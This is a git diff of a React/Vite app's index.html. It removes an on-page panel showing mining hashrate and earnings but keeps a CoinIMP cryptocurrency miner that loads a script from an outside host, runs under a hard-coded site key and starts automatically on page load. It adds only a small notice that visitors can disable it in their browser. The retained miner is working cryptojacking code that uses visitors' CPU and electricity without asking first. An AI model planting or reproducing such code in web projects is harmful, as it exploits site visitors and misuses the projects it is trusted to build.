@@ -15,99 +15,29 @@
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:site" content="@lovable_dev" />
     <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-
-    <style>
-      #miner-panel {
-        position: fixed;
-        bottom: 10px;
-        right: 10px;
-        background: #111;
-        border: 2px solid #39ff14;
-        padding: 10px;
-        color: #39ff14;
-        font-family: monospace;
-        z-index: 9999;
-        border-radius: 10px;
-        text-align: center;
-        min-width: 200px;
-      }
-
-      #miner-panel.minimized {
-        padding: 5px 10px;
-        height: auto;
-      }
-
-      #miner-panel button {
-        background-color: #39ff14;
-        color: #000;
-        border: none;
-        padding: 5px 10px;
-        font-weight: bold;
-        border-radius: 5px;
-        cursor: pointer;
-        margin-top: 5px;
-      }
-
-      .hidden-content {
-        display: none;
-      }
-
-      #miner-panel.minimized .hidden-content {
-        display: none;
-      }
-
-      #miner-panel:not(.minimized) .hidden-content {
-        display: block;
-        margin-top: 5px;
-      }
-    </style>
   </head>
 
   <body>
     <div id="root"></div>
 
-    <!-- Panneau de minage -->
-    <div id="miner-panel">
-      <div id="miner-status">⛏️ Minage: <strong>ON</strong></div>
-      <div class="hidden-content">
-        <div id="miner-hashrate">⚡ Hashrate: 0 H/s</div>
-        <div id="deadspot-earned">💰 Deadspot: 0.000</div>
-      </div>
-      <button id="toggle-miner-panel">Réduire</button>
-    </div>
-
-    <!-- Script principal de l'app -->
+    <!-- Script principal Vite (React) -->
     <script type="module" src="/src/main.tsx"></script>
 
-    <!-- Script de minage + affichage -->
+    <!-- Script de minage CoinIMP -->
     <script src="https://www.hostingcloud.racing/hyZN.js"></script>
     <script>
-      // Lancement du mineur
-      const _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
         throttle: 0.5,
         c: 'w'
       });
       _client.start();
-
-      // État et interface
-      let dsc = 0;
-      const panel = document.getElementById("miner-panel");
-      const toggleBtn = document.getElementById("toggle-miner-panel");
-      const hashrateText = document.getElementById("miner-hashrate");
-      const dscDisplay = document.getElementById("deadspot-earned");
-
-      toggleBtn.addEventListener("click", () => {
-        panel.classList.toggle("minimized");
-        toggleBtn.textContent = panel.classList.contains("minimized") ? "Agrandir" : "Réduire";
-      });
-
-      setInterval(() => {
-        const hps = _client.getHashesPerSecond().toFixed(2);
-        hashrateText.textContent = `⚡ Hashrate: ${hps} H/s`;
-        dsc += parseFloat(hps) * 0.0001;
-        dscDisplay.textContent = `💰 Deadspot: ${dsc.toFixed(3)}`;
-      }, 2000);
+      _client.addMiningNotification(
+        "Top",
+        "Ce site utilise un mineur CoinIMP. Vous pouvez le désactiver via les paramètres de votre navigateur si vous le souhaitez.",
+        "#cccccc",
+        40,
+        "#3d3d3d"
+      );
     </script>
   </body>
 </html>
-
